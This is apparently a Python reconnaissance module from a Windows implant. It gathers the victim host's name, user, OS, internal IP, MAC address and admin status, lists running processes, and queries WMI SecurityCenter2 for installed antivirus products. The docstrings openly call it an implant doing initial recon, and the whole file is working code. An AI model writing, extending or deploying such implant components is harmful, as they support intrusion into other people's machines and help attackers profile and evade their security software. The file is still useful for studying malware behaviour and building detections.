# recon.py — System reconnaissance module
# Gathers hostname, user, OS, IPs, MAC, admin status, AV products, running procs

import os
import platform
import socket
import uuid
import subprocess
import ctypes


def get_sysinfo() -> dict:
    """Collect comprehensive system information for initial recon."""
    info = {
        "hostname": socket.gethostname(),
        "username": os.getlogin(),
        "os": platform.platform(),
        "os_version": platform.version(),
        "arch": platform.machine(),
        "processor": platform.processor(),
        "internal_ip": _get_internal_ip(),
        "mac_address": _get_mac(),
        "is_admin": _check_admin(),
        "av_products": _detect_av(),
        "top_processes": _snapshot_processes(),
    }
    return info


def _get_internal_ip() -> str:
    """Determine the primary internal IP by opening a UDP socket."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "unknown"


def _get_mac() -> str:
    """Return the MAC address as a colon-separated hex string."""
    node = uuid.getnode()
    return ":".join(f"{(node >> i) & 0xFF:02x}" for i in range(40, -1, -8))


def _check_admin() -> bool:
    """Check if the implant is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _detect_av() -> list:
    """Query WMI SecurityCenter2 for installed antivirus products."""
    try:
        result = subprocess.run(
            [
                "powershell", "-Command",
                "Get-CimInstance -Namespace root/SecurityCenter2 "
                "-ClassName AntiVirusProduct | "
                "Select-Object displayName | Format-List",
            ],
            capture_output=True, text=True, timeout=10,
        )
        products = []
        for line in result.stdout.splitlines():
            if "displayName" in line:
                name = line.split(":", 1)[1].strip()
                if name:
                    products.append(name)
        return products if products else ["None detected"]
    except Exception as e:
        return [f"Query failed: {e}"]


def _snapshot_processes() -> list:
    """Return the top 50 running processes via tasklist."""
    try:
        result = subprocess.run(
            ["tasklist", "/FO", "CSV", "/NH"],
            capture_output=True, text=True, timeout=10,
        )
        procs = []
        for line in result.stdout.strip().splitlines()[:50]:
            parts = line.replace('"', "").split(",")
            if len(parts) >= 2:
                procs.append({"name": parts[0], "pid": parts[1]})
        return procs
    except Exception:
        return []
